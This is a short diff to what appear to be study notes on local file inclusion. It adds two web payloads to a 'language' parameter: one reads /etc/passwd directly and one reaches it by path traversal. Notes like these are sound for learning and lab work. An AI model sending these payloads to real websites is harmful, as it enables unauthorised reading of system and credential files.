@@ -1,7 +1,13 @@
 ## Basic LFI
+```bash
+?language=/etc/passwd
+```
 <img width="1582" height="685" alt="image" src="https://github.com/user-attachments/assets/4e2ac86e-c3f5-4ea0-bc0f-03fd437947c8" />
 
 ## Path Traversal
+```bash
+?language=../../../../etc/passwd
+```
 <img width="1580" height="685" alt="image" src="https://github.com/user-attachments/assets/900d504c-28a7-4837-b6a5-54807a7c9455" />
 
 ## Filename Prefix
